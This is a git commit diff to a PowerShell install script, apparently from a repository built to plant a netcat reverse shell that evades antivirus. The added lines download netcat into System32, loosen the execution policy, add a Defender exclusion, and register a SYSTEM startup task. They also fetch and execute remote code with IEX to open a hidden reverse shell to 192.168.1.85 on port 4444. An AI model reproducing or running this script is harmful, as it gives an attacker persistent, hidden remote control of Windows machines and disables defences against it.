62ba30f05af40c38f0616f413e884f32594728e7
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 15:50:47 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,12 +1,8 @@
-try {
-    (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
-} catch {
-    Write-Host "Error downloading restart.ps1: $_"
-}
-
-try {
-    (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
-} catch {
-    Write-Host "Error downloading netcat.zip: $_"
-}
-
+(New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
+Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
+Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
+Set-ExecutionPolicy Unrestricted -Force
+Add-MpPreference -ExclusionPath "C:\Temp\restart.ps1"
+(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
+schtasks /create /tn "Restart" /tr "'powershell.exe' '-ExecutionPolicy Bypass' '-File C:\Temp\restart.ps1'" /sc onstart /ru system /f
+powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
